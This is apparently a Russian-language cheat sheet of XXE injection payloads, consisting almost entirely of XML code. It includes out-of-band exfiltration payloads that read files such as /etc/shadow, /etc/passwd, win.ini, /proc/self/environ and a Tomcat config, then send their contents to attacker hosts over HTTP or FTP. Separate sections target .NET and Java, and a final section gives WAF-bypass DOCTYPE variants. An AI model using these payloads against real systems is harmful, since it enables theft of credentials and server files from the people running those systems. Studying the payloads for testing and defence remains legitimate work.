## XXE


* Обычный xxe 
```
 <?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM
"http://x.x.x.x:443/test.txt"> ]>
<r>&sp;</r>
```

* Out-of-band извлечение данных
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM
"http://x.x.x.x:443/ev.xml">
%sp;
%param1; ]>
<r>&exfil;</r>

ev.xml
 
<!ENTITY % data SYSTEM
"file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM
'http://x.x.x.x:443/?%data;'>">

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM
"file:///etc/shadow">
<!ENTITY % sp SYSTEM
"http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil; ]>

содержание файлов
<!ENTITY % param3 "<!ENTITY &#x25; exfil
SYSTEM 'ftp://Evilhost:port/%data3;'>">

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % start "<![CDATA["> <!ENTITY %
stuff SYSTEM
"file:///usr/local/tomcat/webapps/custom
app/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM
"http://evil/evil.xml">
%dtd; ]>
<root>&all;</root>

содержание файлов
<!ENTITY all "%start;%stuff;%end;">
```

* Out-of-band против .NET
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM
"http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil; ]>

ev.xml

<!ENTITY % data SYSTEM
"file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil
SYSTEM 'http://x.x.x.x:443/?%data;'>">
```

* Out-of-band против Java
```
<?xml version="1.0"?>

<!DOCTYPE r [
<!ENTITY % data3 SYSTEM
"file:///etc/passwd">
<!ENTITY % sp SYSTEM
"http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil; ]>
<r></r>

содержание файлов

<!ENTITY % param1 '<!ENTITY &#x25;
external SYSTEM
"file:///nothere/%payload;">'> %param1;
%external;
```

* Использование FTP
```
<?xml version="1.0" ?>
<!DOCTYPE a [
<!ENTITY % asd SYSTEM
"http://x.x.x.x:4444/ext.dtd">
%asd;
%c; ]>
<a>&rrr;</a>

содержание файлов

<!ENTITY % d SYSTEM
"file:///proc/self/environ">
<!ENTITY % c "<!ENTITY rrr SYSTEM
'ftp://x.x.x.x:2121/%d;'>">
```

* WAF bypass
```
<!DOCTYPE :. SYTEM "http://"
<!DOCTYPE :_-_: SYTEM "http://"
<!DOCTYPE {0xdfbf} SYSTEM "http://"
```



<br>
